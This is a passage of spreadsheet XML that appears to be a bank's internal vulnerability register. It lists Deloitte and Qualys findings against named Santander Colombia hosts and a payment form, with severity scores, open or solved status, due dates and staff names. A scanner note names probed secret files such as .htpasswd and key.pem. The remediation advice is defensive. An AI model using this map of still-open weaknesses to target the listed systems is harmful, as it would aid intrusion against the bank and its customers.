    <s v="CVE-2024-6531_x000a_CVE-2022-31147_x000a_CVE-2021-43306_x000a_CVE-2021-21252"/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-10-15T00:00:00"/>
    <n v="616"/>
    <d v="2025-02-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la aplicación auditada utiliza una versión de bootstrap.min.js con vulnerabilidades públicas asociadas._x000a__x000a_Se ha detectado que la aplicación auditada utiliza una versión de jquery.validate.js con vulnerabilidades públicas asociadas._x000a_"/>
    <s v="Se recomienda actualizar la versión de Bootstrap y jQuery Validation Plugin y establecer una política de actualizaciones o aplicación de parches para tratar evitar posteriores vulnerabilidades._x000a__x000a_Las últimas versiones de ambas librerías pueden ser descargada desde la siguiente dirección URL: _x000a_• https://getbootstrap.com/ _x000a_• https://github.com/jquery-validation/jquery-validation/releases/tag/1.19.5"/>
    <s v="El uso de software o librerías de terceros sin actualizar puede ser comprometido mediante vulnerabilidades conocidas poniendo en riesgo el activo afectado."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="306"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-670cd5317d9a8c7b25e5d0b1"/>
    <s v="SC-24-CNMPO-014-AP-004"/>
    <x v="159"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.4"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-10-15T00:00:00"/>
    <n v="616"/>
    <d v="2025-02-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado una dependencia javascript (/js/cookiesUtils.js) con un método generateUUID() para generar cookies que utiliza Math.random() para generar un valor aleatorio._x000a_"/>
    <s v="Es recomendable reemplazar el uso de Math.random() por una función criptográficamente segura para generar UUIDs, como crypto.randomUUID() o crypto.getRandomValues(). Estas funciones proporcionan un nivel adecuado de aleatoriedad y seguridad, minimizando el riesgo de predicción y garantizando la protección de las cookies y la integridad de las sesiones."/>
    <s v="El uso de un generador de números pseudoaleatorios no seguro para la creación de UUIDs en cookies introduce un riesgo significativo de suplantación de sesiones. Si un atacante logra predecir los UUIDs generados por Math.random(), puede manipular cookies para acceder a cuentas de usuario o datos confidenciales sin autenticación adecuada. Esto compromete la confidencialidad del usuario."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="307"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="VPN"/>
    <s v="MAN-67124e8b96d088205b814175"/>
    <s v="SC-24-CNMPO-018-CO-002"/>
    <x v="160"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="vpnco2.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-10-17T00:00:00"/>
    <n v="614"/>
    <d v="2025-02-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servicio https no muestra que soporte la renegociación segura según el estandar RFC 5746._x000a__x000a_"/>
    <s v="Se recomienda actualizar el software que maneja las comunicaciones TLS y habilitar la renegociación segura segun RFC 5746."/>
    <s v="Un atacante podría forzar la renegociación del cliente con el servidor para descifrar la comunicación cifrada y realizar un ataca Man in the Middle."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Angie Cubillos"/>
  </r>
  <r>
    <n v="308"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="VPN"/>
    <s v="MAN-67124cd696d088205b814173"/>
    <s v="SC-24-CNMPO-017-CO-002"/>
    <x v="160"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="vpnco1.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-10-15T00:00:00"/>
    <n v="616"/>
    <d v="2025-02-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servicio https no muestra que soporte la renegociación segura según el estandar RFC 5746._x000a__x000a_"/>
    <s v="Se recomienda actualizar el software que maneja las comunicaciones TLS y habilitar la renegociación segura segun RFC 5746."/>
    <s v="Un atacante podría forzar la renegociación del cliente con el servidor para descifrar la comunicación cifrada y realizar un ataca Man in the Middle."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Angie Cubillos"/>
  </r>
  <r>
    <n v="309"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santander Token Colombia"/>
    <s v="MAN-6717af0e96d088205b838338"/>
    <s v="SC-24-CNMPO-016-AP-001"/>
    <x v="161"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.9"/>
    <m/>
    <m/>
    <s v="Santander Token Colombia"/>
    <m/>
    <m/>
    <d v="2024-10-21T00:00:00"/>
    <n v="610"/>
    <d v="2025-02-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="En el desarrollo de aplicaciones Android, la ofuscación del código fuente es una técnica de seguridad que dificulta el análisis y la ingeniería inversa. Sin embargo, si una aplicación se distribuye sin ofuscar su código, los atacantes pueden fácilmente descompilar y examinar el código fuente, obteniendo acceso a lógica interna, claves de API, y otras informaciones sensibles._x000a__x000a_Durante la auditoría realizada sobre la aplicación ha sido posible decompilar el código fuente de la misma obteniendo una interpretación del código fuente en un formato legible. "/>
    <s v="Para mitigar esta vulnerabilidad, se deben tomar las siguientes medidas: _x000a_- Ofuscar el Código Fuente: Utilice herramientas como ProGuard o R8 para ofuscar el código antes de distribuir la aplicación. _x000a_- Proteger Claves y Credenciales: Almacene claves API y credenciales de forma segura utilizando Android Keystore o servicios de backend seguros._x000a_- Implementar Análisis de Código: Realice análisis estático y dinámico del código para identificar posibles exposiciones de información. _x000a_- Revisar Librerías de Terceros: Asegúrese de que las bibliotecas de terceros utilizadas también sigan prácticas de ofuscación y seguridad adecuadas."/>
    <s v="La falta de ofuscación del código puede llevar a varios problemas de seguridad, incluyendo: _x000a_- Exposición de lógica interna: Los atacantes pueden entender la lógica de la aplicación y encontrar vulnerabilidades. _x000a_- Robo de información sensible: Acceso a credenciales, claves API y otros datos críticos. _x000a_- Ingeniería inversa fácil: Los atacantes pueden modificar la aplicación para su propio beneficio o crear versiones fraudulentas."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="310"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="MAN-673b27ca86437e5a65e05b8b"/>
    <s v="SC-24-CNMP0-020-CO-001"/>
    <x v="162"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <s v="181.57.221.233"/>
    <s v="http://181.57.221.233/#/views/home"/>
    <m/>
    <m/>
    <d v="2024-11-13T00:00:00"/>
    <n v="587"/>
    <d v="2025-02-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Los formularios de la aplicación carecen o tienen mal implementados los mecanismos que previenen el envío masivo y automatizado de solicitudes, como un sistema CAPTCHA. Esto permite la posibilidad de que un usuario malintencionado intente repetidamente extraer información confidencial mediante un gran número de peticiones, lo que incrementa el riesgo de fuga de información._x000a__x000a_Los formularios de consulta de crédito carecen de sistemas de prevención contra ataques automatizados, se ha podido comprobar que el formulario 2 si cuenta con un sistema CAPTCHA, pero este solamente se encuentra implementado en la parte cliente (navegador del usuario)._x000a__x000a_OCURRENCIA 1 – Formulario 1_x000a_Se muestra una petición y respuesta del formulario 1 de la aplicación, en la cual puede observarse la ausencia de cualquier mecanismo de prevención de ataques automatizados. Un usuario malintencionado podría automatizar la petición GET para modificar el identificador de crédito y visualizar aquellos que quedan con saldo pendiente._x000a__x000a_OCURRENCIA 2 – Formulario 2_x000a_Por otro lado, se muestra el Formulario 2 de la aplicación, en la siguiente imagen se puede observar como el formulario tiene implementado un sistema CAPTCHA, pero este solamente se encuentra en la parte cliente y no en la parte del servidor, por lo que cualquier usuario malintencionado podría capturar la petición y automatizarla.,"/>
    <s v="Para mitigar la vulnerabilidad, se deberá de implementar sistemas contra la automatización_x000a_de peticiones como, por ejemplo, un sistema CAPTCHA. Dicho sistema deberá de_x000a_implementarse tanto en la parte cliente como en la parte servidor."/>
    <s v="La ausencia de protección contra automatización permite a un usuario malintencionado realizar_x000a_ataques de manera eficaz, aumentando la probabilidad de obtener información y exponer_x000a_la confidencialidad de los usuarios."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="311"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-670cd8887d9a8c7b25e5d0b3"/>
    <s v="SC-24-CNMPO-014-CO-006"/>
    <x v="153"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-12-10T00:00:00"/>
    <n v="560"/>
    <d v="2025-04-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad &quot;BREACH&quot; es una instancia del ataque CRIME contra la compresión HTTP de tipo &quot;gzip&quot; o &quot;DEFLATE&quot;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_x000a__x000a_Durante el análisis de las conexiones cifradas se ha podido comprobar que el servidor web ofrece compresión Gzip en sus conexiones."/>
    <s v="Se recomienda deshabilitar la compresión HTTP por completo, reduciendo el rendimiento._x000a_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_x000a_A continuación, se muestra como se deshabilita la compresión HTTP para Apache y NGINX:_x000a_Deshabilitar compresión en Apache:_x000a_• Deshabilite el módulo mod_deflate utilizando el siguiente comando:_x000a_ $ sudo a2dismod deflate_x000a_• Reinicie el servidor:_x000a_ $ sudo /etc/init.d/apache2 restart_x000a_Deshabilitar compresión en NGINX:_x000a_• Establezca la configuración del host con la opción gzip en off:_x000a_ server {_x000a_ server_name www.example.com;_x000a_ listen 443 ssl http2;_x000a_ gzip off;_x000a_ }"/>
    <s v="Un atacante podría aprovechar la vulnerabilidad indicada para descifrar el tráfico entre el navegador_x000a_del cliente y el servidor, y tener acceso a la información transmitida entre ambos a través del canal_x000a_de comunicaciones (datos personales, credenciales de usuario, identificadores de sesión, etc.)"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="312"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-12dbc6b0-9ed7-49b9-98e3-e1e329e9dfe5"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/"/>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13"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-4c2c7a9c-7fb0-435a-a80e-6c1099121bb4"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/?C=N%3BOD"/>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14"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-02ee015a-67f4-4b54-b467-233321f25c4d"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/fonts/"/>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15"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-8bdef08c-dea2-48b4-8c95-9db2a6f26e4b"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/fonts/?C=S%3BOA"/>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16"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-6740989f-a0cd-4d20-83c1-bc0d903af637"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/icons/"/>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17"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-b93dae53-dcc2-4ce9-b5fa-51897aca34e2"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/icons/?C=S%3BOA"/>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18"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-5d9a5414-6836-4b0f-8ecc-ef114b31bcf1"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/icons/categories/"/>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19"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-4bf217e1-cd03-40a3-bb02-1ddcc5fcd102"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/icons/categories/?C=S%3BOA"/>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20"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-8b5b7ab8-3415-43ea-9468-a1b446ed290c"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/icons/categories/_iconos_V1/"/>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21"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-a2efd400-3afb-4bfe-ba29-3c96704a6fea"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/icons/categories/_iconos_V1/?C=S%3BOA"/>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22"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-de7dbffb-a44a-4b73-b860-d91614b3d171"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/icons/categories/_iconos_V2/"/>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23"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-28fbadc8-90e6-4e58-a8ac-7ace71ebd88a"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/icons/categories/_iconos_V2/?C=S%3BOA"/>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24"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-39908f21-1c19-4af5-97f4-c17c39f2a129"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/images/"/>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25"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-9f197577-9a20-4d82-8808-3d42974a1401"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/assets/images/?C=S%3BOA"/>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s v="Proveedor confirma la remediacion de las vulnerabilidades y se confirma con la herramienta de qualys."/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="326"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-ece244a4-c909-4a1b-bfaa-8fc42c649223"/>
    <m/>
    <x v="164"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="6.4"/>
    <m/>
    <m/>
    <s v="https://portalrecaudos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-03-29T00:00:00"/>
    <n v="451"/>
    <d v="2025-06-27T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Bootstrap es un framework CSS gratuito y de código abierto dirigido al desarrollo web responsivo. Contiene plantillas de diseño basadas en HTML, CSS y JavaScript para tipografía, formularios, botones, navegación y otros componentes de la interfaz._x000a__x000a_La aplicación web utiliza una biblioteca JavaScript que se sabe que contiene al menos una vulnerabilidad."/>
    <s v="Consulte la información proporcionada en la sección de respuestas.  Consulte también los avisos de seguridad del proveedor relacionados con la versión vulnerable de la biblioteca."/>
    <m/>
    <m/>
    <s v="Proveedor confirma la remediacion de las vulnerabilidades y se confirma con la herramienta de qualys."/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="327"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-22042845-d7d4-4e20-a5a4-804735dcba1c"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.8"/>
    <m/>
    <m/>
    <s v="https://portalrecaudos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2024-12-06T00:00:00"/>
    <n v="564"/>
    <d v="2025-03-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La página web puede enmarcarse. Esto significa que son posibles los ataques de clickjacking contra los usuarios."/>
    <s v="Entre los mecanismos habituales de prevención del clickjacking se incluyen:_x000a_X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web._x000a_Código JavaScript Framekiller: Se puede utilizar un código JS especial para impedir que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options."/>
    <m/>
    <m/>
    <s v="Proveedor confirma la remediacion de las vulnerabilidades y se confirma con la herramienta de qualys."/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="328"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-4dc35838-eedb-4a1e-8621-bccc4988a138"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.8"/>
    <m/>
    <m/>
    <s v="https://portalrecaudos.santander.com.co/?emp=1&amp;user=John"/>
    <m/>
    <m/>
    <d v="2025-03-29T00:00:00"/>
    <n v="451"/>
    <d v="2025-06-27T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La página web puede enmarcarse. Esto significa que son posibles los ataques de clickjacking contra los usuarios."/>
    <s v="Entre los mecanismos habituales de prevención del clickjacking se incluyen:_x000a_X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web._x000a_Código JavaScript Framekiller: Se puede utilizar un código JS especial para impedir que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options."/>
    <m/>
    <m/>
    <s v="Proveedor confirma la remediacion de las vulnerabilidades y se confirma con la herramienta de qualys."/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="329"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-fe9efec0-ec37-4fa3-9b44-1eb726cfa80d"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.8"/>
    <m/>
    <m/>
    <s v="https://portalrecaudos.santander.com.co/assets/"/>
    <m/>
    <m/>
    <d v="2024-12-06T00:00:00"/>
    <n v="564"/>
    <d v="2025-03-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La página web puede enmarcarse. Esto significa que son posibles los ataques de clickjacking contra los usuarios."/>
    <s v="Entre los mecanismos habituales de prevención del clickjacking se incluyen:_x000a_X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web._x000a_Código JavaScript Framekiller: Se puede utilizar un código JS especial para impedir que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options."/>
    <m/>
    <m/>
    <s v="Proveedor confirma la remediacion de las vulnerabilidades y se confirma con la herramienta de qualys."/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="330"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-75df9d15-395f-41e6-9060-dc0e45a6078d"/>
    <m/>
    <x v="123"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalrecaudos.santander.com.co/assets/css/"/>
    <m/>
    <m/>
    <d v="2025-03-29T00:00:00"/>
    <n v="451"/>
    <d v="2025-06-27T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web."/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <s v="1° Fecha: 30/06/2025"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="331"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-0b7e1d60-ad54-4d4b-9229-e4a082d20a82"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.8"/>
    <m/>
    <m/>
    <s v="https://portalrecaudos.santander.com.co/assets/fonts/"/>
    <m/>
    <m/>
    <d v="2024-12-27T00:00:00"/>
    <n v="543"/>
    <d v="2025-03-27T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La página web puede enmarcarse. Esto significa que son posibles los ataques de clickjacking contra los usuarios."/>
    <s v="Entre los mecanismos habituales de prevención del clickjacking se incluyen:_x000a_X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web._x000a_Código JavaScript Framekiller: Se puede utilizar un código JS especial para impedir que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options."/>
    <m/>
    <m/>
    <s v="Proveedor confirma la remediacion de las vulnerabilidades y se confirma con la herramienta de qualys."/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="332"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-946c67fc-d81b-4b87-bc27-dd11a18cd0e3"/>
    <m/>
    <x v="123"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalrecaudos.santander.com.co/assets/fonts/BUGS"/>
    <m/>
    <m/>
    <d v="2025-03-29T00:00:00"/>
    <n v="451"/>
    <d v="2025-06-27T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web."/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <s v="1° Fecha: 30/06/2025"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="333"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-342ff6df-2d9f-4423-b520-63b6f5118f36"/>
    <m/>
    <x v="123"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalrecaudos.santander.com.co/assets/images/"/>
    <m/>
    <m/>
    <d v="2024-12-06T00:00:00"/>
    <n v="564"/>
    <d v="2025-03-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web."/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <s v="1° Fecha: 30/06/2025"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="334"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-26245544-7a4d-4daf-b690-a42b5bd95251"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalrecaudos.santander.com.co/icons/small/"/>
    <m/>
    <m/>
    <d v="2024-12-06T00:00:00"/>
    <n v="564"/>
    <d v="2025-03-06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s v="1° Fecha: 30/06/2025"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="335"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <s v="QA-WAS-af131c7f-6755-4482-bd56-05d0f6117d96"/>
    <m/>
    <x v="141"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/common/squidGuard.conf.template"/>
    <m/>
    <m/>
    <d v="2025-03-29T00:00:00"/>
    <n v="451"/>
    <d v="2025-06-27T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha descubierto un archivo potencialmente sensible en el servidor Web. Este archivo puede o no estar directamente asociado con la aplicación web. _x000a_Archivos comprobados:_x000a_nginx.conf, .htpasswd, key.pem, certificate.pem_x000a_Lógica de detección de QID:_x000a_Este QID envía una solicitud GET al servidor de destino para recuperar el contenido del archivo."/>
    <s v="Compruebe que el acceso a este archivo está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="336"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <s v="QA-WAS-b966c71b-24a3-4cf3-9795-bf093a89eba1"/>
    <m/>
    <x v="123"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/webclient/download/"/>
    <m/>
    <m/>
    <d v="2024-09-06T00:00:00"/>
    <n v="655"/>
    <d v="2024-12-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web."/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="337"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-40f3502b-de0d-4749-ae10-f1d395eddfde"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.8"/>
    <m/>
    <m/>
